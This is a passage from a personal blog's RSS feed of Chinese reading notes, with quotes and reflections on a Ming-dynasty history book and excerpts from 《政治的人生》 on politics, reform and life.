&lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;你还很年轻，先不要去美化自己以后的路，先想想自己不愿意成为怎样的人，去看看他们的缺点，去引以为戒。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;周国平先生曾说过这样一段话，“人生有三次成长：第一次是在发现自己不再是世界中心的时候；第二次是在发现即使再怎么努力，终究还是有些事令人无能为力的时候；第三次是在明知道有些事可能会无能为力，但还是会尽力争取的时候。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;时间教会了我们很多东西，有一些我们曾经深信不疑的，后来却发现其实它根本就没有，有一些我们认为没有的，后来才发现其实它确确实实存在。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;斯宾诺莎曾经说过，“诚实的人从来讨厌虚伪的人，而虚伪的人却常常以诚实的面目出现。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;少时初读《送东阳马生序》，不以为意，长大后才明白，别说读书太苦，那是我们去看世界的路。恋爱过才读懂，年少时以为爱情是山盟海誓的热烈、是奋不顾身的勇敢，但如果爱的卑微，也终是遍体鳞伤。升学考公时才想起范进中举，最初嘲笑范进，后来理解范进，终是成为范进；找工作时才读懂孔乙己，脱不下的长衫不正是我们在所谓的体面和生活之间反复挣扎的高台吗？谈婚论嫁时才读懂孔雀东南飞，原来生活的酸甜苦辣，喜怒哀乐早已注定在各自的原生家庭中！人生好像就是这样，岁月匆匆如流水，初读不知书中意，再见已是书中人，可是回不去的何止是时间呀，遥远的又何止是距离呢？还有那些身边渐行渐远的人，和那个曾经风华的自己，所以我们如果无能为力，那就顺其自然吧；如果心无所侍，那就随遇而安吧。年轻时执着什么都不为过，成熟时放弃什么都不是错，最后，愿你历尽千帆，不染岁月风尘，听风八百遍，才知是人间。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“世界上所有的爱都以聚合为最终目的，只有一种爱以分离为目的，那就是父母对子女的爱。父母真正成功的爱，就是让孩子尽早作为一个独立的个体从你的生命中分离出去，这种分离越早，你就越成功。”——纪伯伦&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;你欣赏的东西体现了你的品味和智趣，你讨厌的东西体现你的底线和原则。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;永远不要和一个智商低的人争论，他会把你的智商拉到和他一个水平，然后用丰富的经验打败你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;永远不要为自己的不合群而内耗，总有人会欣赏你，会和你成为朋友。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;尼采曾说过，“越是向往高处的阳光，它的根就越要伸向黑暗的地底”。你不知道何为黑暗，也就不能明白光明的真正样子。正义向上的人，往往早已经看透了黑暗的本来面貌，在看透黑暗的本来面貌时仍能保持初心，那样才能是真正的正义向上。而强大的人必同时理解光明与黑暗的含义，向往光明的人，若不熟知何为黑暗，就会像根浅的树一样被人一推就倒。放到现实中就是：社会中有很多黑暗面，这些黑暗面往往带来了诱惑。当你像张白纸一样自称自己是正义的人时，其实你并不配正义二字。你只有真正的在了解黑暗面，仍能保持初心后，你才能配得上正义，才能成为强大的人。想当个好人，首先要明白何为坏人！&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所以历史经验告诉我们，做人就不要内耗了，你在别人眼里什么样，主要取决于对方的立场，而不取决于你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;变通是为了做事，不变通是为了做人。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;想到杨绛先生关于看书的一句话：小的时候看书是为了了解这个世界，长大后才发现不了解这个世界根本看不懂书。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;要允许亲人撞南墙，要看着朋友走弯路，要目送爱人踩深坑，因为疼痛是最好的老师，而说教是最毒的仇恨。费尽力气把经历伤痛的感悟传递，帮助别人尽可能少走弯路，别人却不能领悟，而是仇恨。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;感悟&#34;&gt;&lt;span&gt;感悟&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%84%9f%e6%82%9f&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;明朝，最有气节的一个朝代，不和亲，不赔款，不割地。天子守国门，君王死社稷。&#xA;看完之后，对“实现中华民族伟大复兴”有了更深刻的理解。对比明朝和清朝，大致也理解了“前人无能，把中国搞成这样”所指。明朝的火器水平世界领先，抗倭援朝对日本降维打击，别人在玩枪我们就玩炮了。&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;看完之后，我觉得最大的收获，大概是知道了自己想怎么活，想成为什么样的人。&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;记录一下让我印象深刻的部分人物：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;王阳明，真正的圣贤，当之无愧。知行合一；“此心光明，亦复何言”；“天下之大，虽离家万里，何处不可往！何事不可为！”；“此心不动，随机而行。”；心如止水者，虽繁华纷扰之世间红尘，已然空无一物。&lt;br&gt;&lt;/li&gt;&#xA;&lt;li&gt;杨继盛，有种，实在太有种了。“他没有麻药，也不用铁环，更没有塞嘴的白毛巾，只是带着一副平静的表情，不停地刮着腐肉，碗片并不锋利，腐肉也不易割断，这是令人难以忍受的剧烈疼痛，然而，杨继盛没有发出一点儿声音”。“杨继盛继续着他的工作，腐肉已经刮得差不多了，骨头露了出来，他开始截去附在骨头上面的筋膜”。&lt;br&gt;&lt;/li&gt;&#xA;&lt;li&gt;杨涟，千年之下，终究不朽。不求钱财，不求富贵，不求青史留名，有慨然雄浑之气，万刃加身不改之志。&lt;br&gt;&lt;/li&gt;&#xA;&lt;li&gt;李时珍，见过最穷的贫民，也看过最富的天子，到过寒酸的茅舍，也走过金銮大殿，人世间的富贵、疾苦他已了然于胸。抛弃荣华富贵，历经困苦三十年著书救人的唯一动机与目的：“因为我本来就是个医生啊！”&lt;br&gt;&lt;/li&gt;&#xA;&lt;li&gt;于谦，身居高位却清廉正直，在这个污浊的世界上，能够干干净净的度过自己的一生&lt;/li&gt;&#xA;&lt;li&gt;戚继光，少年时写下他的理想：小筑暂高枕，忧时旧有盟。呼樽来揖客，挥麈坐谈兵。云护牙签满，星含宝剑横。封侯非我意，但愿海波平。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;收集一下金句：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;庄子的儿子——庄（装）孙子&lt;/li&gt;&#xA;&lt;li&gt;他只有两件事不会，这也不会，那也不会&lt;/li&gt;&#xA;&lt;li&gt;八窍通了七窍——一窍不通&lt;/li&gt;&#xA;&lt;li&gt;麻雀啄牛屁股——确实牛逼&lt;/li&gt;&#xA;&lt;li&gt;铁哥们儿，也是会生锈的&lt;/li&gt;&#xA;&lt;li&gt;无论是铁哥们儿，还是钛哥们儿，在利益面前，都是一脚蹬&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;最后再重复一遍书中的一句话：成功只有一个——按照自己的方式，去度过人生。&lt;/p&gt;</description>
    </item>
    <item>
      <title>《政治的人生》</title>
      <link>http://localhost:1313/posts/read_zzdrs/</link>
      <pubDate>Tue, 13 Jan 2026 02:13:53 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_zzdrs/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;生活在这个世界上的人：有的是弱者；有的是强者；有的要别人来设定目标，有的给别人设定目标；有的需要感情支持生活，有的需要意志支持生活。我大概在每一对概念中都会选择做后一种人。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;生活在今天的人，常常说前人无能，把中国搞成这样，我们希望以后的中国人不会说今天的中国人无能，把中国搞成这样。这是我最大的愿望。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;什么叫政治家？应该是具有至死不渝的信念、学贯中西的知识、高山仰止的人格、高瞻远瞩的目光、百折不挠的毅力、海纳百川的胸襟、纵揽全局的能力，等等。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;不少人讨论很多辩论技巧，但是没有意识到逻辑能力的重要意义，根本意义，这样不能有优秀的辩手。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;又加了一段写幽默和机智的文字。这些东西获得很不容易，一定要来自一种生活的态度，一种对生活超越的态度、认真的态度，或对生命道路的一种超脱的选择。这样才会有幽默，否则不能谈幽默。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这样的场合，人往往会有一种悲凉的感觉，越是热闹越是如此。从中感觉到自己生命的存在，感觉到世界是多么强大的外在力量，是可以不依人的感觉和情绪而存在的力量，是可以不依人的理性和理想而存在的力量。在平平淡淡的生活中，人们往往忘记了自己，觉得自己融入了社会和世界。但是，当世界沸腾起来时，才发现自己孤独安静的存在。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;社会就是这样的一种力量，使一个平凡的人突然在别人的眼中变得不平凡了。如果自己也认为是这样，就难以把握自己了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;任何一种改革总是会在解决一些旧矛盾的同时，产生新矛盾。然后人们又要花力气来解决新矛盾。社会就是在这个过程中进步的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;王沪宁也许不是一个均质的整体，而是一个变化的整体，他不断创新自我和消除自我。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人总是一定时代的产物。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人的生命总是要有寄托的，在失去了父母之后，你会突然觉得这样的寄托是重要的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;中国社会的发展，慢慢人们也明白了道理，这样大的社会不可能一夜之间发生变革，变成一个全新的世界，而要逐渐地进步。在改革的设计上，也不能一下子就拿出整套的方案，而是要摸着石头过河。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人往往会迷惑的，越集中精力越迷惑，有时散漫一些，反而不会糊涂。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;当一切美好都可以被金钱所调动，或者为金钱所驱动的时候，美好就不美好了。&lt;/div&gt;&#xD;&#xA;    